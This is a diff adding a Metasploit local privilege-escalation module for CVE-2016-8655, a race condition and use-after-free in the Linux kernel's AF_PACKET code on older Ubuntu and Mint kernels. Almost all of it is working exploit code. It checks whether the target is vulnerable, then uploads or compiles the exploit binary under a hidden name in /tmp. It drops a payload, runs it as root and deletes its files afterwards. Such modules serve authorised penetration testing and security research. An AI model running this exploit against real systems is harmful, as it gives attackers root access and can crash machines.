@@ -1,0 +1,182 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = GoodRanking
+
+  include Msf::Post::File
+  include Msf::Post::Linux::Priv
+  include Msf::Post::Linux::Compile
+  include Msf::Post::Linux::System
+  include Msf::Post::Linux::Kernel
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+  prepend Msf::Exploit::Remote::AutoCheck
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'AF_PACKET chocobo_root Privilege Escalation',
+      'Description'    => %q{
+        This module exploits a race condition and use-after-free in the
+        packet_set_ring function in net/packet/af_packet.c (AF_PACKET) in
+        the Linux kernel to execute code as root (CVE-2016-8655).
+
+        The bug was initially introduced in 2011 and patched in 2016 in version
+        4.4.0-53.74, potentially affecting a large number of kernels; however
+        this exploit targets only systems using Ubuntu (Trusty / Xenial) kernels
+        4.4.0 < 4.4.0-53, including Linux distros based on Ubuntu, such as
+        Linux Mint.
+
+        The target system must have unprivileged user namespaces enabled,
+        two or more CPU cores, and SMAP must be disabled.
+
+        Bypasses for SMEP and KASLR are included. Failed exploitation
+        may crash the kernel.
+
+        This module has been tested successfully on
+
+        Linux Mint 17.3 (x86_64);
+        Linux Mint 18 (x86_64);
+        Ubuntu 16.04 (x86_64); and
+        Ubuntu 16.04.2 (x86_64).
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'rebel', # Discovery and chocobo_root.c exploit
+          'bcoles' # Metasploit
+        ],
+      'DisclosureDate' => '2016-08-12',
+      'Platform'       => [ 'linux' ],
+      'Arch'           => [ ARCH_X86, ARCH_X64 ],
+      'SessionTypes'   => [ 'shell', 'meterpreter' ],
+      'Targets'        => [[ 'Auto', {} ]],
+      'Privileged'     => true,
+      'References'     =>
+        [
+          [ 'EDB', '40871' ],
+          [ 'CVE', '2016-8655' ],
+          [ 'BID', '94692' ],
+          [ 'URL', 'https://seclists.org/oss-sec/2016/q4/607' ],
+          [ 'URL', 'https://seclists.org/oss-sec/2016/q4/att-621/chocobo_root_c.bin' ],
+          [ 'URL', 'https://github.com/bcoles/kernel-exploits/blob/master/CVE-2016-8655/chocobo_root.c' ],
+          [ 'URL', 'https://bitbucket.org/externalist/1day_exploits/src/master/CVE-2016-8655/CVE-2016-8655_chocobo_root_commented.c' ],
+          [ 'URL', 'https://usn.ubuntu.com/3151-1/' ],
+          [ 'URL', 'https://www.securitytracker.com/id/1037403' ],
+          [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=84ac7260236a49c79eede91617700174c2c19b0c' ]
+        ],
+      'Notes'          =>
+        {
+          'AKA'         => ['chocobo_root.c'],
+          'Reliability' => [ REPEATABLE_SESSION ],
+          'Stability'   => [ CRASH_OS_DOWN ]
+        },
+      'DefaultTarget'  => 0
+    ))
+    register_options [
+      OptInt.new('TIMEOUT', [ true, 'Race timeout (seconds)', '600' ]),
+    ]
+    register_advanced_options [
+      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
+    ]
+  end
+
+  def timeout
+    datastore['TIMEOUT'].to_i
+  end
+
+  def base_dir
+    datastore['WritableDir'].to_s
+  end
+
+  def check
+    arch = kernel_hardware
+    unless arch.include? 'x86_64'
+      return CheckCode::Safe("System architecture #{arch} is not supported")
+    end
+    vprint_good "System architecture #{arch} is supported"
+
+    offsets = strip_comments(exploit_data('CVE-2016-8655', 'chocobo_root.c')).scan(/kernels\[\] = \{(.+?)\};/m).flatten.first
+    kernels = offsets.scan(/"(.+?)"/).flatten
+
+    version = "#{kernel_release} #{kernel_version.split(' ').first}"
+    unless kernels.include? version
+      return CheckCode::Safe("Linux kernel #{version} is not vulnerable")
+    end
+    vprint_good "Linux kernel #{version} is vulnerable"
+
+    if smap_enabled?
+      return CheckCode::Safe('SMAP is enabled')
+    end
+    vprint_good 'SMAP is not enabled'
+
+    if lkrg_installed?
+      return CheckCode::Safe('LKRG is installed')
+    end
+    vprint_good 'LKRG is not installed'
+
+    if grsec_installed?
+      return CheckCode::Safe('grsecurity is in use')
+    end
+    vprint_good 'grsecurity is not in use'
+
+    cores = get_cpu_info[:cores].to_i
+    min_required_cores = 2
+    unless cores >= min_required_cores
+      return CheckCode::Safe("System has less than #{min_required_cores} CPU cores")
+    end
+    vprint_good "System has #{cores} CPU cores"
+
+    config = kernel_config
+    if config.nil?
+      return CheckCode::Unknown('Could not retrieve kernel config')
+    end
+
+    unless config.include? 'CONFIG_USER_NS=y'
+      return CheckCode::Safe('Kernel config does not include CONFIG_USER_NS')
+    end
+    vprint_good 'Kernel config has CONFIG_USER_NS enabled'
+
+    unless userns_enabled?
+      return CheckCode::Safe('Unprivileged user namespaces are not permitted')
+    end
+    vprint_good 'Unprivileged user namespaces are permitted'
+
+    CheckCode::Appears
+  end
+
+  def exploit
+    if !datastore['ForceExploit'] && is_root?
+      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')
+    end
+
+    unless writable? base_dir
+      fail_with Failure::BadConfig, "#{base_dir} is not writable"
+    end
+
+    # Upload exploit executable
+    executable_name = ".#{rand_text_alphanumeric(5..10)}"
+    executable_path = "#{base_dir}/#{executable_name}"
+    if live_compile?
+      vprint_status 'Live compiling exploit on system...'
+      upload_and_compile executable_path, exploit_data('CVE-2016-8655', 'chocobo_root.c'), '-lpthread'
+    else
+      vprint_status 'Dropping pre-compiled exploit on system...'
+      upload_and_chmodx executable_path, exploit_data('CVE-2016-8655', 'chocobo_root')
+    end
+
+    # Upload payload executable
+    payload_path = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}"
+    upload_and_chmodx payload_path, generate_payload_exe
+
+    # Launch exploit
+    print_status "Launching exploit (Timeout: #{timeout})..."
+    output = cmd_exec "echo '#{payload_path} & exit' | #{executable_path}", nil, timeout
+    output.each_line { |line| vprint_status line.chomp }
+    print_status "Cleaning up #{payload_path} and #{executable_path}.."
+    rm_f executable_path
+    rm_f payload_path
+  end
+end
